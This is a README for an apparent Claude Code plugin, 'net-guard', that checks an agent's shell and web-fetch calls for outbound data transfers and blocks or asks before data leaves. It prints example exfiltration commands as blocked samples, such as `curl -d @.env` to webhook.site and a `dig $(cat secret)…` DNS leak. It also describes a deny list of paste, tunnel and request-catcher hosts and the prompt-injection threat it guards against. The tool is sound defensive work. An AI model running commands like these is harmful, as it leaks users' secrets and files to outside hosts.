# 🌐 net-guard

> Your data doesn't leave without you knowing. Every `curl`, `wget`, `ssh`, `scp`, `git push` and `WebFetch` is checked against an allow list and a deny list. Paste sites and request catchers are blocked, and you're asked before data goes anywhere new, **even with `--dangerously-skip-permissions`**.

```text
● Bash(curl -d @.env https://webhook.site/3f9c…)
  ⎿  Error: net-guard blocked this command: it sends data to webhook.site, a paste,
     request-catcher or tunnel service often used to smuggle data out.

╭─ net-guard ─────────────────────────────────────────────────╮
│ net-guard: this command sends data to backup.example.net,    │
│ which isn't on the allow list.                               │
│                                                              │
│   $ scp ./db.sql me@backup.example.net:/tmp/                 │
│                                                              │
│ Let it through?                                              │
│ ❯ 1. Allow once                                              │
│   2. Allow backup.example.net this session                   │
│   3. Block                                                   │
╰──────────────────────────────────────────────────────────────╯
```

A prompt injection in a web page or a README only needs one `curl -d @.env` to win. net-guard sits on every `Bash` and `WebFetch` call, subagents included, below the permission system, so it still applies when nothing else asks.

## Features

- **Reads the command, not just the text.** It understands curl flags (including clusters like `-sSLX POST` and `--url`), wget, httpie (`http POST host name=x`), `nc`, `ssh` (with `-J` jump hosts), `scp` and `rsync` (`user@host:path`), git remotes (`clone`, `fetch`, `push`, and `remote add`, whose later pushes it can't follow), URL literals in `python -c` and `node -e`, `bash -c "…"`, `$(…)`, and wrappers such as `sudo`, `env` and `xargs`. `git commit -m "curl https://x"` is ignored; `echo $(curl …)` isn't.
- **Knows an upload from a read.** Request bodies (`-d`, `--data*`, `--json`, `-F`, `-T`, POST, PUT, PATCH, DELETE), `wget --post-*`, `git push`, `scp`/`rsync` to a remote, and `ssh`/`nc` sessions count as sending data.
- **Policy, in order:**
  1. Your `deny` list: always blocked.
  2. Your `allow` list: always allowed. This even lifts the built-in deny list.
  3. The built-in deny list: paste sites, file drops, request catchers, tunnels, OAST/collaborator hosts, Discord webhooks and the Telegram bot API.
  4. Allowed without asking:
     - this machine (`localhost`, `127.x`, `::1`)
     - the built-in allow list: GitHub, GitLab, Bitbucket, npm, PyPI, crates.io, RubyGems, the Go proxy, MDN, Python and Node docs, Stack Overflow, Wikipedia, Anthropic docs
     - hosts you allowed this session
     - private networks
  5. Uploads to any other host ask.
  6. Everything else follows `unknown` for shell commands (ask by default) and `fetchUnknown` for WebFetch (allow by default). WebFetch still asks when the URL looks like it carries data, such as a long token in the query.
- **One dialog per call.** It offers Allow once, Allow *host* this session, or Block. When nobody can answer, as in `-p`, it blocks. A refusal tells the model why and not to route around it.
- **Commands:**
  - `/net-guard` shows the policy, the session's allowed hosts and the counts.
  - `/net-guard check <url or command>` is a dry run.
  - `/net-guard allow <host>` allows a host for the rest of the session.
  - `/net-guard forget` clears the session's allowed hosts.

## Install

```shell
/plugin marketplace add Singh-AP/awesome-claude-mods
/plugin install net-guard@awesome-claude-mods
```

Requires Claude Code 2.1.287 or later.

## Configuration

Set these in `/config`, or under `pluginConfigs` in `settings.json`.

| Option | Default | What it does |
| --- | --- | --- |
| `unknown` | `ask` | Shell commands reaching a host on neither list: `ask`, `allow` or `deny`. |
| `fetchUnknown` | `allow` | WebFetch reads of a host on neither list: `allow` (still asks for data-carrying URLs), `ask` or `deny`. |
| `askUploads` | `unlisted` | When sending data asks: `unlisted` hosts only, `always` (even GitHub, e.g. to catch a gist upload), or `never`. |
| `allow` | empty | Extra allowed hosts, comma-separated. `example.com` covers its subdomains, `*.example.com` only the subdomains, `example.com/path` only that path. |
| `deny` | empty | Extra hosts that are always blocked. |
| `useDefaultLists` | `true` | Start from the built-in allow and deny lists. |
| `allowPrivate` | `true` | Treat LAN addresses (`10.x`, `192.168.x`, `172.16–31.x`, `100.64/10`, `*.local`, `*.internal`) as allowed. Cloud metadata (`169.254.169.254`) is never treated as private. |

## How it works

| Event | Why |
| --- | --- |
| `tool.call` on `Bash` and `WebFetch` | Finds each request, decides allow / ask / deny, asks with `$.ui.ask`, or returns `{ deny }` |
| `command.run` | `/net-guard` status, `check`, `allow`, `forget` |
| `$.store` | Keeps the all-time blocked count |

It never makes a network call itself. The parsers (`hooks/requests.ts`, `hooks/hosts.ts`) and the policy (`hooks/policy.ts`) are pure TypeScript with no `$`, so you can reuse them.

## Test it

```shell
claude plugin test mods/safety/net-guard   # 27 tests
```

## Limitations

- It reads command text. A host built at run time (`curl "$URL"`) can't be named, so the call follows `unknown`, which asks by default. A script file that does its own networking is checked only if its command line names the host.
- `git push origin` goes to a named remote whose URL it doesn't look up. It checks remotes when they're added with `git remote add` or `set-url` instead.
- DNS exfiltration (`dig $(cat secret).example.com`), cloud CLIs (`aws s3 cp`) and package publishing aren't covered. For publishing, see [bash-guard](../bash-guard/).
- Hosts allowed with "this session" reset when the mod reloads.
- It's a guard, not a firewall. For hard guarantees, run Claude Code with an egress-filtering proxy or a network-restricted sandbox.
